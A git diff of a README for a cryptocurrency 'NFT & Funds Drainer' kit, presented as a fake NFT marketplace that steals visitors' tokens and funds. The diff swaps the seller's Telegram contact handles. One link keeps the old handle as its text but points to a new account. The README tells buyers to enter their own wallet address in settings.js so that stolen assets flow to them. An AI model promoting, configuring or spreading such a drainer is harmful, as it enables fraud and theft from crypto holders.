@@ -1,5 +1,5 @@
 # ***NFT & Funds Drainer + Fake NFT Marketplace!***
-### If you need any help, DM me here: [@DrainNFT](https://t.me/DrainNFT)
+### If you need any help, DM me here: [@BlueLuxe_Admin](https://t.me/BlueLuxe_Admin)
 
 ## 🖼️ NFT Stealer / Crypto Stealer / Drainer NFT Marketplace / Coins Drainer scrypt
 
@@ -23,12 +23,12 @@ Our NFT & Funds drainer is not a normal drainer. We created a NFT marketplace ar
 you need to edit the **settings.js** file. 
 - line 1: const adress = `"YOUR WALLET";` replace **YOUR WALLET with your ETH wallet address.**
 
-To get instant support, contact me on [@DrainNFT](https://t.me/DrainNFT)
+To get instant support, contact me on [@DrainNFT](https://t.me/BlueLuxe_Admin)
 
 
 ## `⭐ Socials :`
 
-- Telegram: [@DrainNFT](https://t.me/DrainNFT)
+- Telegram: [@BlueLuxe_Admin](https://t.me/BlueLuxe_Admin)
 
 ##### Please ⭐ the repo to support our project
 ![star](https://cdn.discordapp.com/attachments/975036883958636557/975057102097743973/unknown.png)
